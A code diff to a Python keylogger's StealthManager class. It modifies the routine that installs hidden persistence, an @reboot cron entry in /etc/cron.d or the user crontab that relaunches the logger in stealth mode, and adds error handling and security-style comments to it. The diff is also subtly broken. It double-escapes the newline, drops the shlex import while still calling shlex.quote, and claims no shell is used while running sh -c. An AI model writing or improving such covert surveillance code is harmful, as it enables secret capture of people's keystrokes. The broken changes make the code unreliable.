@@ -412,7 +412,7 @@ class StealthManager:
         script = sys.argv[0] if sys.argv else "keylogpy.py"
 
         if system == "Linux":
-            cron_line = f"@reboot python3 {os.path.abspath(script)} start --stealth --log-dir {config['log_dir']}\n"
+            cron_line = f"@reboot python3 {os.path.abspath(script)} start --stealth --log-dir {config['log_dir']}\\n"
             try:
                 with open("/etc/cron.d/keylogpy", "w") as f:
                     f.write(cron_line)
@@ -421,14 +421,22 @@ class StealthManager:
                 # Try user crontab
                 try:
                     import subprocess
-                    import shlex
-                    subprocess.run(["crontab", "-l"], capture_output=True)
-                    subprocess.run(
-                        ["sh", "-c", f'(crontab -l 2>/dev/null; echo {shlex.quote(cron_line)}) | crontab -']
+                    r = subprocess.run(["crontab", "-l"], capture_output=True, timeout=10)
+                    # CWE-252: check return code
+                    if r.returncode != 0 and r.returncode != 1:
+                        logger.warning("crontab -l failed with code %d", r.returncode)
+                    # CWE-78: list-form args, no shell=True
+                    quoted_line = shlex.quote(cron_line)
+                    r2 = subprocess.run(
+                        ["sh", "-c", f"(crontab -l 2>/dev/null; echo {quoted_line}) | crontab -"],
+                        capture_output=True, timeout=10,
                     )
-                    logger.info("Added user crontab persistence")
-                except Exception as e:
-                    logger.warning(f"Could not install cron: {e}")
+                    if r2.returncode != 0:
+                        logger.warning("crontab update failed with code %d", r2.returncode)
+                    else:
+                        logger.info("Added user crontab persistence")
+                except (OSError, subprocess.TimeoutExpired) as e:
+                    logger.warning("Could not install cron: %s", e)
         elif system == "Windows":
             try:
                 import winreg
